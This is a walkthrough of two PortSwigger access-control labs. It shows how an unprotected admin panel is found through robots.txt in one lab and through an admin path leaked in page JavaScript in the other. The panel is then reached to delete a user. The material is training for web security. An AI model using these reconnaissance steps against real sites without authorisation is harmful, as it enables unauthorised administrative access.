# 1 [Lab: Unprotected admin functionality](https://portswigger.net/web-security/access-control/lab-unprotected-admin-functionality)

This lab has an unprotected admin panel.

Solve the lab by deleting the user carlos.

add to URL:

```bash
robots.txt
```

```bash
https://0aba0081040734fd80a385cd002c0010.web-security-academy.net/robots.txt
```

res:

```bash
User-agent: *
Disallow: /administrator-panel
```

add to URL:

```bash
/administrator-panel
```

send in URL:

```bash
https://0aba0081040734fd80a385cd002c0010.web-security-academy.net/administrator-panel
```

res:

```bash
Users
wiener - Delete
carlos - Delete
```

# 2 [Lab: Unprotected admin functionality with unpredictable URL](https://portswigger.net/web-security/access-control/lab-unprotected-admin-functionality-with-unpredictable-url)

This lab has an unprotected admin panel. It's located at an unpredictable location, but the location is disclosed somewhere in the application.

Solve the lab by accessing the admin panel, and using it to delete the user carlos.

add to URL:

```bash
robots.txt
```

```bash
https://0aba0081040734fd80a385cd002c0010.web-security-academy.net/robots.txt
```

res:

```bash
"Not Found"
```

in home page go to => view page sourse
sourse is:

```js
 <script>
var isAdmin = false;
if (isAdmin) {
   var topLinksTag = document.getElementsByClassName("top-links")[0];
   var adminPanelTag = document.createElement('a');
   adminPanelTag.setAttribute('href', '/admin-zq67oz');
   adminPanelTag.innerText = 'Admin panel';
   topLinksTag.append(adminPanelTag);
   var pTag = document.createElement('p');
   pTag.innerText = '|';
   topLinksTag.appendChild(pTag);
}
</script>
```

find:

```bash
adminPanelTag.setAttribute('href', '/admin-zq67oz');
```

```bash
/admin-zq67oz
```

send

```bash
https://0aba0081040734fd80a385cd002c0010.web-security-academy.net/admin-zq67oz
```

res:

```bash
Users
wiener - Delete
carlos - Delete
```
